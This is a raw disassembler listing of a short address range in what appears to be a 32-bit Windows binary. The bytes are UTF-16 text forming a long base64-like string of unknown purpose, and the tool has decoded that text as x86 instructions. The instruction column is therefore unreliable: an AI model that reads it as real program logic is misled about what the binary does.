  40a605:	00 65 00             	add    %ah,0x0(%ebp)
  40a608:	49                   	dec    %ecx
  40a609:	00 33                	add    %dh,(%ebx)
  40a60b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a60e:	73 00                	jae    0x40a610
  40a610:	72 00                	jb     0x40a612
  40a612:	6d                   	insl   (%dx),%es:(%edi)
  40a613:	00 7a 00             	add    %bh,0x0(%edx)
  40a616:	34 00                	xor    $0x0,%al
  40a618:	52                   	push   %edx
  40a619:	00 56 00             	add    %dl,0x0(%esi)
  40a61c:	78 00                	js     0x40a61e
  40a61e:	30 00                	xor    %al,(%eax)
  40a620:	46                   	inc    %esi
  40a621:	00 78 00             	add    %bh,0x0(%eax)
  40a624:	6e                   	outsb  %ds:(%esi),(%dx)
  40a625:	00 4b 00             	add    %cl,0x0(%ebx)
  40a628:	6f                   	outsl  %ds:(%esi),(%dx)
  40a629:	00 41 00             	add    %al,0x0(%ecx)
  40a62c:	41                   	inc    %ecx
  40a62d:	00 43 00             	add    %al,0x0(%ebx)
  40a630:	78 00                	js     0x40a632
  40a632:	4e                   	dec    %esi
  40a633:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a636:	59                   	pop    %ecx
  40a637:	00 52 00             	add    %dl,0x0(%edx)
  40a63a:	30 00                	xor    %al,(%eax)
  40a63c:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40a640:	6c                   	insb   (%dx),%es:(%edi)
  40a641:	00 6e 00             	add    %ch,0x0(%esi)
  40a644:	39 00                	cmp    %eax,(%eax)
  40a646:	48                   	dec    %eax
  40a647:	00 48 00             	add    %cl,0x0(%eax)
  40a64a:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40a64e:	33 00                	xor    (%eax),%eax
  40a650:	54                   	push   %esp
  40a651:	00 69 00             	add    %ch,0x0(%ecx)
  40a654:	56                   	push   %esi
  40a655:	00 56 00             	add    %dl,0x0(%esi)
  40a658:	47                   	inc    %edi
  40a659:	00 75 00             	add    %dh,0x0(%ebp)
  40a65c:	33 00                	xor    (%eax),%eax
  40a65e:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a662:	58                   	pop    %eax
  40a663:	00 5a 00             	add    %bl,0x0(%edx)
  40a666:	6c                   	insb   (%dx),%es:(%edi)
  40a667:	00 7a 00             	add    %bh,0x0(%edx)
  40a66a:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40a66d:	00 37                	add    %dh,(%edi)
  40a66f:	00 37                	add    %dh,(%edi)
  40a671:	00 61 00             	add    %ah,0x0(%ecx)
  40a674:	6c                   	insb   (%dx),%es:(%edi)
  40a675:	00 58 00             	add    %bl,0x0(%eax)
  40a678:	75 00                	jne    0x40a67a
  40a67a:	49                   	dec    %ecx
  40a67b:	00 5a 00             	add    %bl,0x0(%edx)
  40a67e:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40a682:	54                   	push   %esp
  40a683:	00 50 00             	add    %dl,0x0(%eax)
  40a686:	57                   	push   %edi
  40a687:	00 4e 00             	add    %cl,0x0(%esi)
  40a68a:	79 00                	jns    0x40a68c
  40a68c:	47                   	inc    %edi
  40a68d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a690:	4b                   	dec    %ebx
  40a691:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40a695:	00 57 00             	add    %dl,0x0(%edi)
  40a698:	7a 00                	jp     0x40a69a
  40a69a:	31 00                	xor    %eax,(%eax)
  40a69c:	37                   	aaa
  40a69d:	00 69 00             	add    %ch,0x0(%ecx)
  40a6a0:	68 00 63 00 75       	push   $0x75006300
  40a6a5:	00 75 00             	add    %dh,0x0(%ebp)
  40a6a8:	74 00                	je     0x40a6aa
  40a6aa:	30 00                	xor    %al,(%eax)
  40a6ac:	62 00                	bound  %eax,(%eax)
  40a6ae:	74 00                	je     0x40a6b0
  40a6b0:	4a                   	dec    %edx
  40a6b1:	00 38                	add    %bh,(%eax)
  40a6b3:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40a6b7:	00 6e 00             	add    %ch,0x0(%esi)
  40a6ba:	70 00                	jo     0x40a6bc
  40a6bc:	6c                   	insb   (%dx),%es:(%edi)
  40a6bd:	00 56 00             	add    %dl,0x0(%esi)
  40a6c0:	68 00 79 00 6d       	push   $0x6d007900
  40a6c5:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40a6c9:	00 42 00             	add    %al,0x0(%edx)
  40a6cc:	35 00 41 00 51       	xor    $0x51004100,%eax
  40a6d1:	00 6f 00             	add    %ch,0x0(%edi)
  40a6d4:	70 00                	jo     0x40a6d6
  40a6d6:	73 00                	jae    0x40a6d8
  40a6d8:	44                   	inc    %esp
  40a6d9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a6dc:	55                   	push   %ebp
  40a6dd:	00 7a 00             	add    %bh,0x0(%edx)
  40a6e0:	55                   	push   %ebp
  40a6e1:	00 68 00             	add    %ch,0x0(%eax)
  40a6e4:	31 00                	xor    %eax,(%eax)
  40a6e6:	6c                   	insb   (%dx),%es:(%edi)
  40a6e7:	00 38                	add    %bh,(%eax)
  40a6e9:	00 76 00             	add    %dh,0x0(%esi)
  40a6ec:	79 00                	jns    0x40a6ee
  40a6ee:	63 00                	arpl   %eax,(%eax)
  40a6f0:	4c                   	dec    %esp
  40a6f1:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40a6f5:	00 45 00             	add    %al,0x0(%ebp)
  40a6f8:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40a6fc:	48                   	dec    %eax
  40a6fd:	00 65 00             	add    %ah,0x0(%ebp)
  40a700:	74 00                	je     0x40a702
  40a702:	30 00                	xor    %al,(%eax)
  40a704:	5a                   	pop    %edx
  40a705:	00 6d 00             	add    %ch,0x0(%ebp)
  40a708:	44                   	inc    %esp
  40a709:	00 37                	add    %dh,(%edi)
  40a70b:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40a70f:	00 66 00             	add    %ah,0x0(%esi)
  40a712:	76 00                	jbe    0x40a714
  40a714:	52                   	push   %edx
  40a715:	00 53 00             	add    %dl,0x0(%ebx)
  40a718:	55                   	push   %ebp
  40a719:	00 78 00             	add    %bh,0x0(%eax)
  40a71c:	38 00                	cmp    %al,(%eax)
  40a71e:	46                   	inc    %esi
  40a71f:	00 38                	add    %bh,(%eax)
  40a721:	00 69 00             	add    %ch,0x0(%ecx)
  40a724:	67 00 6d 00          	add    %ch,0x0(%di)
  40a728:	2b 00                	sub    (%eax),%eax
  40a72a:	6c                   	insb   (%dx),%es:(%edi)
  40a72b:	00 68 00             	add    %ch,0x0(%eax)
  40a72e:	57                   	push   %edi
  40a72f:	00 41 00             	add    %al,0x0(%ecx)
  40a732:	72 00                	jb     0x40a734
  40a734:	62 00                	bound  %eax,(%eax)
  40a736:	6f                   	outsl  %ds:(%esi),(%dx)
  40a737:	00 59 00             	add    %bl,0x0(%ecx)
  40a73a:	45                   	inc    %ebp
  40a73b:	00 33                	add    %dh,(%ebx)
  40a73d:	00 2b                	add    %ch,(%ebx)
  40a73f:	00 75 00             	add    %dh,0x0(%ebp)
  40a742:	6f                   	outsl  %ds:(%esi),(%dx)
  40a743:	00 4d 00             	add    %cl,0x0(%ebp)
  40a746:	2b 00                	sub    (%eax),%eax
  40a748:	45                   	inc    %ebp
  40a749:	00 55 00             	add    %dl,0x0(%ebp)
  40a74c:	6d                   	insl   (%dx),%es:(%edi)
  40a74d:	00 77 00             	add    %dh,0x0(%edi)
  40a750:	34 00                	xor    $0x0,%al
  40a752:	30 00                	xor    %al,(%eax)
  40a754:	6c                   	insb   (%dx),%es:(%edi)
  40a755:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40a759:	00 39                	add    %bh,(%ecx)
  40a75b:	00 39                	add    %bh,(%ecx)
  40a75d:	00 49 00             	add    %cl,0x0(%ecx)
  40a760:	62 00                	bound  %eax,(%eax)
  40a762:	6a 00                	push   $0x0
  40a764:	31 00                	xor    %eax,(%eax)
  40a766:	4d                   	dec    %ebp
  40a767:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40a76b:	00 7a 00             	add    %bh,0x0(%edx)
  40a76e:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40a772:	4a                   	dec    %edx
  40a773:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40a777:	00 37                	add    %dh,(%edi)
  40a779:	00 37                	add    %dh,(%edi)
  40a77b:	00 5a 00             	add    %bl,0x0(%edx)
  40a77e:	4c                   	dec    %esp
  40a77f:	00 32                	add    %dh,(%edx)
  40a781:	00 45 00             	add    %al,0x0(%ebp)
  40a784:	37                   	aaa
  40a785:	00 59 00             	add    %bl,0x0(%ecx)
  40a788:	4c                   	dec    %esp
  40a789:	00 58 00             	add    %bl,0x0(%eax)
  40a78c:	48                   	dec    %eax
  40a78d:	00 70 00             	add    %dh,0x0(%eax)
  40a790:	77 00                	ja     0x40a792
  40a792:	58                   	pop    %eax
  40a793:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40a797:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40a79b:	00 71 00             	add    %dh,0x0(%ecx)
  40a79e:	51                   	push   %ecx
  40a79f:	00 7a 00             	add    %bh,0x0(%edx)
  40a7a2:	35 00 73 00 48       	xor    $0x48007300,%eax
  40a7a7:	00 77 00             	add    %dh,0x0(%edi)
  40a7aa:	48                   	dec    %eax
  40a7ab:	00 58 00             	add    %bl,0x0(%eax)
  40a7ae:	56                   	push   %esi
  40a7af:	00 41 00             	add    %al,0x0(%ecx)
  40a7b2:	33 00                	xor    (%eax),%eax
  40a7b4:	41                   	inc    %ecx
  40a7b5:	00 38                	add    %bh,(%eax)
  40a7b7:	00 4f 00             	add    %cl,0x0(%edi)
  40a7ba:	33 00                	xor    (%eax),%eax
  40a7bc:	68 00 36 00 64       	push   $0x64003600
  40a7c1:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40a7c5:	00 32                	add    %dh,(%edx)
  40a7c7:	00 67 00             	add    %ah,0x0(%edi)
  40a7ca:	77 00                	ja     0x40a7cc
  40a7cc:	46                   	inc    %esi
  40a7cd:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7d0:	4d                   	dec    %ebp
  40a7d1:	00 4a 00             	add    %cl,0x0(%edx)
  40a7d4:	55                   	push   %ebp
  40a7d5:	00 71 00             	add    %dh,0x0(%ecx)
  40a7d8:	62 00                	bound  %eax,(%eax)
  40a7da:	41                   	inc    %ecx
  40a7db:	00 49 00             	add    %cl,0x0(%ecx)
  40a7de:	63 00                	arpl   %eax,(%eax)
  40a7e0:	56                   	push   %esi
  40a7e1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7e4:	6b 00 67             	imul   $0x67,(%eax),%eax
  40a7e7:	00 6f 00             	add    %ch,0x0(%edi)
  40a7ea:	38 00                	cmp    %al,(%eax)
  40a7ec:	33 00                	xor    (%eax),%eax
  40a7ee:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40a7f2:	49                   	dec    %ecx
  40a7f3:	00 6a 00             	add    %ch,0x0(%edx)
  40a7f6:	78 00                	js     0x40a7f8
  40a7f8:	79 00                	jns    0x40a7fa
  40a7fa:	76 00                	jbe    0x40a7fc
  40a7fc:	7a 00                	jp     0x40a7fe
  40a7fe:	78 00                	js     0x40a800
  40a800:	44                   	inc    %esp
  40a801:	00 72 00             	add    %dh,0x0(%edx)
  40a804:	6f                   	outsl  %ds:(%esi),(%dx)
  40a805:	00 32                	add    %dh,(%edx)
  40a807:	00 71 00             	add    %dh,0x0(%ecx)
  40a80a:	45                   	inc    %ebp
  40a80b:	00 32                	add    %dh,(%edx)
  40a80d:	00 73 00             	add    %dh,0x0(%ebx)
  40a810:	76 00                	jbe    0x40a812
  40a812:	65 00 33             	add    %dh,%gs:(%ebx)
  40a815:	00 48 00             	add    %cl,0x0(%eax)
  40a818:	4e                   	dec    %esi
  40a819:	00 37                	add    %dh,(%edi)
  40a81b:	00 38                	add    %bh,(%eax)
  40a81d:	00 66 00             	add    %ah,0x0(%esi)
  40a820:	59                   	pop    %ecx
  40a821:	00 2b                	add    %ch,(%ebx)
  40a823:	00 35 00 4b 00 47    	add    %dh,0x47004b00
  40a829:	00 62 00             	add    %ah,0x0(%edx)
  40a82c:	75 00                	jne    0x40a82e
  40a82e:	44                   	inc    %esp
  40a82f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a832:	51                   	push   %ecx
  40a833:	00 5a 00             	add    %bl,0x0(%edx)
  40a836:	78 00                	js     0x40a838
  40a838:	69 00 36 00 4c 00    	imul   $0x4c0036,(%eax),%eax
  40a83e:	72 00                	jb     0x40a840
  40a840:	32 00                	xor    (%eax),%al
  40a842:	2b 00                	sub    (%eax),%eax
  40a844:	4e                   	dec    %esi
  40a845:	00 38                	add    %bh,(%eax)
  40a847:	00 69 00             	add    %ch,0x0(%ecx)
  40a84a:	6a 00                	push   $0x0
  40a84c:	54                   	push   %esp
  40a84d:	00 55 00             	add    %dl,0x0(%ebp)
  40a850:	63 00                	arpl   %eax,(%eax)
  40a852:	64 00 38             	add    %bh,%fs:(%eax)
  40a855:	00 50 00             	add    %dl,0x0(%eax)
  40a858:	41                   	inc    %ecx
  40a859:	00 50 00             	add    %dl,0x0(%eax)
  40a85c:	46                   	inc    %esi
  40a85d:	00 78 00             	add    %bh,0x0(%eax)
  40a860:	62 00                	bound  %eax,(%eax)
  40a862:	53                   	push   %ebx
  40a863:	00 51 00             	add    %dl,0x0(%ecx)
  40a866:	4d                   	dec    %ebp
  40a867:	00 63 00             	add    %ah,0x0(%ebx)
  40a86a:	35 00 57 00 51       	xor    $0x51005700,%eax
  40a86f:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40a873:	00 33                	add    %dh,(%ebx)
  40a875:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40a879:	00 37                	add    %dh,(%edi)
  40a87b:	00 50 00             	add    %dl,0x0(%eax)
  40a87e:	31 00                	xor    %eax,(%eax)
  40a880:	6f                   	outsl  %ds:(%esi),(%dx)
  40a881:	00 6b 00             	add    %ch,0x0(%ebx)
  40a884:	45                   	inc    %ebp
  40a885:	00 6f 00             	add    %ch,0x0(%edi)
  40a888:	74 00                	je     0x40a88a
  40a88a:	4e                   	dec    %esi
  40a88b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a88e:	37                   	aaa
  40a88f:	00 45 00             	add    %al,0x0(%ebp)
  40a892:	50                   	push   %eax
  40a893:	00 4b 00             	add    %cl,0x0(%ebx)
  40a896:	39 00                	cmp    %eax,(%eax)
  40a898:	7a 00                	jp     0x40a89a
  40a89a:	55                   	push   %ebp
  40a89b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a89e:	65 00 35 00 63 00 4f 	add    %dh,%gs:0x4f006300
  40a8a5:	00 50 00             	add    %dl,0x0(%eax)
  40a8a8:	6a 00                	push   $0x0
  40a8aa:	79 00                	jns    0x40a8ac
  40a8ac:	6b 00 50             	imul   $0x50,(%eax),%eax
  40a8af:	00 48 00             	add    %cl,0x0(%eax)
  40a8b2:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40a8b6:	6d                   	insl   (%dx),%es:(%edi)
  40a8b7:	00 6e 00             	add    %ch,0x0(%esi)
  40a8ba:	4c                   	dec    %esp
  40a8bb:	00 39                	add    %bh,(%ecx)
  40a8bd:	00 62 00             	add    %ah,0x0(%edx)
  40a8c0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8c1:	00 77 00             	add    %dh,0x0(%edi)
  40a8c4:	2f                   	das
  40a8c5:	00 51 00             	add    %dl,0x0(%ecx)
  40a8c8:	7a 00                	jp     0x40a8ca
  40a8ca:	71 00                	jno    0x40a8cc
  40a8cc:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40a8d0:	46                   	inc    %esi
  40a8d1:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40a8d5:	00 50 00             	add    %dl,0x0(%eax)
  40a8d8:	62 00                	bound  %eax,(%eax)
  40a8da:	49                   	dec    %ecx
  40a8db:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  40a8df:	00 6a 00             	add    %ch,0x0(%edx)
  40a8e2:	4f                   	dec    %edi
  40a8e3:	00 43 00             	add    %al,0x0(%ebx)
  40a8e6:	50                   	push   %eax
  40a8e7:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40a8eb:	00 55 00             	add    %dl,0x0(%ebp)
  40a8ee:	47                   	inc    %edi
  40a8ef:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40a8f3:	00 65 00             	add    %ah,0x0(%ebp)
  40a8f6:	4b                   	dec    %ebx
  40a8f7:	00 58 00             	add    %bl,0x0(%eax)
  40a8fa:	79 00                	jns    0x40a8fc
  40a8fc:	49                   	dec    %ecx
  40a8fd:	00 61 00             	add    %ah,0x0(%ecx)
  40a900:	2b 00                	sub    (%eax),%eax
  40a902:	34 00                	xor    $0x0,%al
  40a904:	62 00                	bound  %eax,(%eax)
  40a906:	6d                   	insl   (%dx),%es:(%edi)
  40a907:	00 2f                	add    %ch,(%edi)
  40a909:	00 72 00             	add    %dh,0x0(%edx)
  40a90c:	4e                   	dec    %esi
  40a90d:	00 73 00             	add    %dh,0x0(%ebx)
  40a910:	49                   	dec    %ecx
  40a911:	00 56 00             	add    %dl,0x0(%esi)
  40a914:	77 00                	ja     0x40a916
  40a916:	6a 00                	push   $0x0
  40a918:	31 00                	xor    %eax,(%eax)
  40a91a:	30 00                	xor    %al,(%eax)
  40a91c:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40a920:	4e                   	dec    %esi
  40a921:	00 2f                	add    %ch,(%edi)
  40a923:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40a927:	00 72 00             	add    %dh,0x0(%edx)
  40a92a:	2b 00                	sub    (%eax),%eax
  40a92c:	2f                   	das
  40a92d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a930:	53                   	push   %ebx
  40a931:	00 76 00             	add    %dh,0x0(%esi)
  40a934:	33 00                	xor    (%eax),%eax
  40a936:	35 00 47 00 77       	xor    $0x77004700,%eax
  40a93b:	00 78 00             	add    %bh,0x0(%eax)
  40a93e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a93f:	00 69 00             	add    %ch,0x0(%ecx)
  40a942:	59                   	pop    %ecx
  40a943:	00 58 00             	add    %bl,0x0(%eax)
  40a946:	6e                   	outsb  %ds:(%esi),(%dx)
  40a947:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40a94b:	00 31                	add    %dh,(%ecx)
  40a94d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a950:	58                   	pop    %eax
  40a951:	00 35 00 4b 00 74    	add    %dh,0x74004b00
  40a957:	00 42 00             	add    %al,0x0(%edx)
  40a95a:	6d                   	insl   (%dx),%es:(%edi)
  40a95b:	00 49 00             	add    %cl,0x0(%ecx)
  40a95e:	43                   	inc    %ebx
  40a95f:	00 62 00             	add    %ah,0x0(%edx)
  40a962:	32 00                	xor    (%eax),%al
  40a964:	4e                   	dec    %esi
  40a965:	00 4b 00             	add    %cl,0x0(%ebx)
  40a968:	63 00                	arpl   %eax,(%eax)
  40a96a:	50                   	push   %eax
  40a96b:	00 43 00             	add    %al,0x0(%ebx)
  40a96e:	51                   	push   %ecx
  40a96f:	00 38                	add    %bh,(%eax)
  40a971:	00 63 00             	add    %ah,0x0(%ebx)
  40a974:	4e                   	dec    %esi
  40a975:	00 2f                	add    %ch,(%edi)
  40a977:	00 69 00             	add    %ch,0x0(%ecx)
  40a97a:	53                   	push   %ebx
  40a97b:	00 78 00             	add    %bh,0x0(%eax)
  40a97e:	35 00 63 00 75       	xor    $0x75006300,%eax
  40a983:	00 65 00             	add    %ah,0x0(%ebp)
  40a986:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40a98a:	69 00 6c 00 53 00    	imul   $0x53006c,(%eax),%eax
  40a990:	6d                   	insl   (%dx),%es:(%edi)
  40a991:	00 32                	add    %dh,(%edx)
  40a993:	00 36                	add    %dh,(%esi)
  40a995:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a998:	54                   	push   %esp
  40a999:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a99c:	43                   	inc    %ebx
  40a99d:	00 75 00             	add    %dh,0x0(%ebp)
  40a9a0:	35 00 39 00 51       	xor    $0x51003900,%eax
  40a9a5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9a8:	31 00                	xor    %eax,(%eax)
  40a9aa:	63 00                	arpl   %eax,(%eax)
  40a9ac:	55                   	push   %ebp
  40a9ad:	00 58 00             	add    %bl,0x0(%eax)
  40a9b0:	56                   	push   %esi
  40a9b1:	00 63 00             	add    %ah,0x0(%ebx)
  40a9b4:	41                   	inc    %ecx
  40a9b5:	00 46 00             	add    %al,0x0(%esi)
  40a9b8:	57                   	push   %edi
  40a9b9:	00 61 00             	add    %ah,0x0(%ecx)
  40a9bc:	4b                   	dec    %ebx
  40a9bd:	00 78 00             	add    %bh,0x0(%eax)
  40a9c0:	6b 00 51             	imul   $0x51,(%eax),%eax
  40a9c3:	00 56 00             	add    %dl,0x0(%esi)
  40a9c6:	31 00                	xor    %eax,(%eax)
  40a9c8:	63 00                	arpl   %eax,(%eax)
  40a9ca:	4c                   	dec    %esp
  40a9cb:	00 37                	add    %dh,(%edi)
  40a9cd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9d0:	39 00                	cmp    %eax,(%eax)
  40a9d2:	47                   	inc    %edi
  40a9d3:	00 7a 00             	add    %bh,0x0(%edx)
  40a9d6:	78 00                	js     0x40a9d8
  40a9d8:	48                   	dec    %eax
  40a9d9:	00 57 00             	add    %dl,0x0(%edi)
  40a9dc:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40a9e0:	6c                   	insb   (%dx),%es:(%edi)
  40a9e1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9e4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9e5:	00 69 00             	add    %ch,0x0(%ecx)
  40a9e8:	69 00 45 00 4d 00    	imul   $0x4d0045,(%eax),%eax
  40a9ee:	63 00                	arpl   %eax,(%eax)
  40a9f0:	69 00 4e 00 71 00    	imul   $0x71004e,(%eax),%eax
  40a9f6:	54                   	push   %esp
  40a9f7:	00 4f 00             	add    %cl,0x0(%edi)
  40a9fa:	36 00 30             	add    %dh,%ss:(%eax)
  40a9fd:	00 61 00             	add    %ah,0x0(%ecx)
  40aa00:	72 00                	jb     0x40aa02
  40aa02:	46                   	inc    %esi
  40aa03:	00 79 00             	add    %bh,0x0(%ecx)
  40aa06:	55                   	push   %ebp
  40aa07:	00 38                	add    %bh,(%eax)
  40aa09:	00 38                	add    %bh,(%eax)
  40aa0b:	00 72 00             	add    %dh,0x0(%edx)
  40aa0e:	2b 00                	sub    (%eax),%eax
  40aa10:	71 00                	jno    0x40aa12
  40aa12:	70 00                	jo     0x40aa14
  40aa14:	30 00                	xor    %al,(%eax)
  40aa16:	4a                   	dec    %edx
  40aa17:	00 59 00             	add    %bl,0x0(%ecx)
  40aa1a:	74 00                	je     0x40aa1c
  40aa1c:	6b 00 34             	imul   $0x34,(%eax),%eax
  40aa1f:	00 79 00             	add    %bh,0x0(%ecx)
  40aa22:	75 00                	jne    0x40aa24
  40aa24:	54                   	push   %esp
  40aa25:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa28:	70 00                	jo     0x40aa2a
  40aa2a:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40aa2e:	51                   	push   %ecx
  40aa2f:	00 35 00 64 00 4b    	add    %dh,0x4b006400
  40aa35:	00 6a 00             	add    %ch,0x0(%edx)
  40aa38:	56                   	push   %esi
  40aa39:	00 68 00             	add    %ch,0x0(%eax)
  40aa3c:	5a                   	pop    %edx
  40aa3d:	00 79 00             	add    %bh,0x0(%ecx)
  40aa40:	76 00                	jbe    0x40aa42
  40aa42:	7a 00                	jp     0x40aa44
  40aa44:	4b                   	dec    %ebx
  40aa45:	00 70 00             	add    %dh,0x0(%eax)
  40aa48:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa49:	00 4f 00             	add    %cl,0x0(%edi)
  40aa4c:	2f                   	das
  40aa4d:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa50:	4b                   	dec    %ebx
  40aa51:	00 63 00             	add    %ah,0x0(%ebx)
  40aa54:	52                   	push   %edx
  40aa55:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa58:	77 00                	ja     0x40aa5a
  40aa5a:	62 00                	bound  %eax,(%eax)
  40aa5c:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40aa5f:	00 41 00             	add    %al,0x0(%ecx)
  40aa62:	35 00 32 00 31       	xor    $0x31003200,%eax
  40aa67:	00 2f                	add    %ch,(%edi)
  40aa69:	00 35 00 48 00 35    	add    %dh,0x35004800
  40aa6f:	00 65 00             	add    %ah,0x0(%ebp)
  40aa72:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40aa76:	33 00                	xor    (%eax),%eax
  40aa78:	71 00                	jno    0x40aa7a
  40aa7a:	57                   	push   %edi
  40aa7b:	00 55 00             	add    %dl,0x0(%ebp)
  40aa7e:	70 00                	jo     0x40aa80
  40aa80:	77 00                	ja     0x40aa82
  40aa82:	61                   	popa
  40aa83:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa86:	48                   	dec    %eax
  40aa87:	00 4e 00             	add    %cl,0x0(%esi)
  40aa8a:	62 00                	bound  %eax,(%eax)
  40aa8c:	2b 00                	sub    (%eax),%eax
  40aa8e:	59                   	pop    %ecx
  40aa8f:	00 76 00             	add    %dh,0x0(%esi)
  40aa92:	71 00                	jno    0x40aa94
  40aa94:	51                   	push   %ecx
  40aa95:	00 38                	add    %bh,(%eax)
  40aa97:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40aa9b:	00 63 00             	add    %ah,0x0(%ebx)
  40aa9e:	2f                   	das
  40aa9f:	00 67 00             	add    %ah,0x0(%edi)
  40aaa2:	47                   	inc    %edi
  40aaa3:	00 4d 00             	add    %cl,0x0(%ebp)
  40aaa6:	4c                   	dec    %esp
  40aaa7:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40aaab:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aaae:	4a                   	dec    %edx
  40aaaf:	00 6e 00             	add    %ch,0x0(%esi)
  40aab2:	4d                   	dec    %ebp
  40aab3:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40aab7:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40aabb:	00 30                	add    %dh,(%eax)
  40aabd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aac0:	59                   	pop    %ecx
  40aac1:	00 41 00             	add    %al,0x0(%ecx)
  40aac4:	35 00 76 00 71       	xor    $0x71007600,%eax
  40aac9:	00 68 00             	add    %ch,0x0(%eax)
  40aacc:	76 00                	jbe    0x40aace
  40aace:	30 00                	xor    %al,(%eax)
  40aad0:	33 00                	xor    (%eax),%eax
  40aad2:	32 00                	xor    (%eax),%al
  40aad4:	79 00                	jns    0x40aad6
  40aad6:	4f                   	dec    %edi
  40aad7:	00 62 00             	add    %ah,0x0(%edx)
  40aada:	59                   	pop    %ecx
  40aadb:	00 71 00             	add    %dh,0x0(%ecx)
  40aade:	6d                   	insl   (%dx),%es:(%edi)
  40aadf:	00 36                	add    %dh,(%esi)
  40aae1:	00 33                	add    %dh,(%ebx)
  40aae3:	00 6f 00             	add    %ch,0x0(%edi)
  40aae6:	4e                   	dec    %esi
  40aae7:	00 59 00             	add    %bl,0x0(%ecx)
  40aaea:	66 00 46 00          	data16 add %al,0x0(%esi)
  40aaee:	7a 00                	jp     0x40aaf0
  40aaf0:	38 00                	cmp    %al,(%eax)
  40aaf2:	2b 00                	sub    (%eax),%eax
  40aaf4:	68 00 44 00 2f       	push   $0x2f004400
  40aaf9:	00 6d 00             	add    %ch,0x0(%ebp)
  40aafc:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40aaff:	00 4e 00             	add    %cl,0x0(%esi)
  40ab02:	30 00                	xor    %al,(%eax)
  40ab04:	4a                   	dec    %edx
  40ab05:	00 67 00             	add    %ah,0x0(%edi)
  40ab08:	58                   	pop    %eax
  40ab09:	00 36                	add    %dh,(%esi)
  40ab0b:	00 73 00             	add    %dh,0x0(%ebx)
  40ab0e:	4e                   	dec    %esi
  40ab0f:	00 47 00             	add    %al,0x0(%edi)
  40ab12:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40ab16:	56                   	push   %esi
  40ab17:	00 79 00             	add    %bh,0x0(%ecx)
  40ab1a:	49                   	dec    %ecx
  40ab1b:	00 62 00             	add    %ah,0x0(%edx)
  40ab1e:	69 00 6d 00 64 00    	imul   $0x64006d,(%eax),%eax
  40ab24:	72 00                	jb     0x40ab26
  40ab26:	4d                   	dec    %ebp
  40ab27:	00 42 00             	add    %al,0x0(%edx)
  40ab2a:	44                   	inc    %esp
  40ab2b:	00 39                	add    %bh,(%ecx)
  40ab2d:	00 4a 00             	add    %cl,0x0(%edx)
  40ab30:	7a 00                	jp     0x40ab32
  40ab32:	74 00                	je     0x40ab34
  40ab34:	72 00                	jb     0x40ab36
  40ab36:	37                   	aaa
  40ab37:	00 30                	add    %dh,(%eax)
  40ab39:	00 37                	add    %dh,(%edi)
  40ab3b:	00 57 00             	add    %dl,0x0(%edi)
  40ab3e:	7a 00                	jp     0x40ab40
  40ab40:	31 00                	xor    %eax,(%eax)
  40ab42:	47                   	inc    %edi
